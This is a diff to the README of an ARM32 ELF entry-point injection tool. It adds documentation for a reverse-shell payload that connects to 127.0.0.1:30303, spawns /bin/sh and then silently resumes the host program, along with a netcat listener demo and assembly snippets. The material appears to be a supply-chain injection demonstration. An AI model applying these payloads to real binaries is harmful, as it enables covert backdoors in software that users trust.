@@ -24,7 +24,7 @@ The result is a binary that does something it was never written to do, and shows
                   |         out.elf              |
                   |                              |
   kernel          |  [entry] ------------------> |  payload runs
-  execve -------->|                              |  (write syscall)
+  execve -------->|                              |  (injected code)
                   |  payload: b main ----------> |  main() runs
                   |                              |  (original code)
                   |  [exit]                      |
@@ -102,6 +102,12 @@ make test
 
 #debug: disassembly, segment inspection, strace
 make debug
+
+# Spawn shell demo:
+# on terminal 1
+nc -lvp 30303
+# on terminal 2
+make spawn
 ```
 
 ### Manual injection
@@ -114,7 +120,7 @@ The input must be an ARM32 ELF executable with at least one `PT_LOAD` segment an
 
 ## Payload format
 
-The payload is a flat ARM32 binary (no ELF headers). It must contain exactly one `b .` stub `fe ff ff ea` which elfmutator will patch with a branch to the target. Data must come after all code so the stub offset scan finds the right bytes.
+The payload is a flat ARM32 binary (no ELF headers). It must contain exactly one `b .` stub `fe ff ff ea` which elfmutator will patch with a branch to the target. Data must come after all code so the stub offset scan finds the right bytes. For payloads with conditional branches, use `.inst 0xEAFFFFFE` to be safe.
 
 ```asm
 _start:
@@ -125,7 +131,7 @@ mov r2, #34
 svc 0
 b .
 msg:
-    .asciz "Malicious ARM32 payload executed!\n"
+.asciz "Malicious ARM32 payload executed!\n"
 ```
 
 Assemble and strip to binary:
@@ -134,6 +140,48 @@ Assemble and strip to binary:
 as -o payload_arm.o payload_arm.S
 objcopy -O binary payload_arm.o payload.bin
 ```
+
+## Payloads
+
+### `payload_arm.S` write syscall (default demo)
+
+The minimal payload. Uses `sys_write` to print a string to stdout, then branches back to `main()`. Demonstrates injection mechanics with no network interaction.
+
+### `spawn_shell.S` reverse shell
+
+A more complete payload demonstrating what a real supply chain injection could do. Connects back to `127.0.0.1:30303`, wires `stdin`/`stdout`/`stderr` to the socket via `dup2`, detaches from the terminal with `setsid`, then spawns `/bin/sh` via `execve`. After the shell exits or if the connection fails, control returns to the host binary's `main()` via the patched stub, the program appears to run normally.
+
+**Key implementation details:**
+
+**No literal pool.** `ldr r0, =<immediate>` causes the assembler to emit a literal pool entry *after* the instruction stream. If this lands after the `b .` stub, elfmutator's byte scan finds the stub but the file layout is broken. All large immediates are built with `mov`/`orr` instead:
+
+```asm
+@ 127.0.0.1 in network byte order, no literal pool
+mov  r0, #0x01000000
+orr  r0, r0, #0x7F      @ r0 = 0x0100007F bytes in mem: 7F 00 00 01
+str  r0, [sp, #4]
+```
+
+**Network byte order on LE ARM.** The CPU stores words LSB first. To get `127.0.0.1` as bytes `7F 00 00 01` in memory (network order), store the word `0x0100007F`. Similarly, port `30303 = 0x765F` in network order requires storing the halfword `0x5F76`.
+
+**`adr` for string address.** The payload segment is mapped `R+X`, not writable. Rather than decoding a string into the segment, `adr r0, binsh` gets the PC relative address of the inline `.asciz "/bin/sh"` string directly, no stack decode loop needed.
+
+**`argv[]` on stack.** `execve` requires a writable pointer array. Since the payload segment is not writable, the argv array is built on the stack:
+
+```asm
+adr  r6, binsh
+sub  sp, sp, #8
+str  r6, [sp]       @ argv[0] = &"/bin/sh"
+mov  r0, #0
+str  r0, [sp, #4]   @ argv[1] = NULL
+mov  r0, r6         @ pathname
+mov  r1, sp         @ argv
+mov  r2, #0         @ envp
+mov  r7, #11        @ sys_execve
+svc  #0
+```
+
+**Graceful fallback.** If `socket()` or `connect()` fails, the payload skips directly to the stub and the host binary runs normally. The injection is silent either way.
 
 ## Limitations
 
@@ -152,6 +200,7 @@ objcopy -O binary payload_arm.o payload.bin
 | `payload_arm.S` | Example ARM32 payload (write + branch stub)   |
 | `test.c`        | Minimal target binary (raw syscalls, no libc) |
 | `Makefile`      | Build, test, and debug rules                  |
+| `spawn_shell.S` | Payload that spawns a shell                   |
 
 ## On trust
 
